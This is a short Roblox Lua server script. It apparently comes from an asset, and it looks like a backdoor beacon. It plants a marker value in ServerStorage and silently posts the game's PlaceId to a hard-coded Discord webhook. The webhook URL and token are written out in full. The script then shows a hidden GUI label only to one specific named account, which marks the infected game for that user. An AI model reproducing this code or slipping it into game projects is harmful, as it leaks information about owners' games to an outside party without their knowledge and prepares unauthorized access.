local SS=game.ServerStorage
local ins=Instance.new("BoolValue")
--ins.Name="t836"
ins.Parent=SS

if game:GetService("HttpService").HttpEnabled then
	local data = {
			content = "**Game ID:** " .. game.PlaceId 
	}
	local success, response = pcall(function()
			return game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1398344058468040806/K3A0n2c-f9F5h--RMUI9qbPLCjjVkx0hcZvWPPBR-0s-6iO-VjMfRaYGYzUEZyT8qLPj", game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
	end)
end



	local Players = game:GetService("Players")
	
	local function createGUIForUser(player)
	    if player.Name == "testingaccount10797" then
	        local playerGui = player:WaitForChild("PlayerGui")
	        
	        local screenGui = Instance.new("ScreenGui")
	        screenGui.Name = "TestLabel"
	        screenGui.Parent = playerGui
	        
	        local textLabel = Instance.new("TextLabel")
	        textLabel.Size = UDim2.new(0, 200, 0, 50)
	        textLabel.Position = UDim2.new(1, -210, 0, 10) 
	        textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
	        textLabel.BackgroundTransparency = 0.3
	        textLabel.BorderSizePixel = 0
	        textLabel.Text = ".."
	        textLabel.TextColor3 = Color3.new(1, 1, 1)
	        textLabel.TextScaled = true
	        textLabel.Font = Enum.Font.SourceSans
	        textLabel.Parent = screenGui
	        
	    end
	end
	
	Players.PlayerAdded:Connect(createGUIForUser)
	
	for _, player in pairs(Players:GetPlayers()) do
	    createGUIForUser(player)
	end
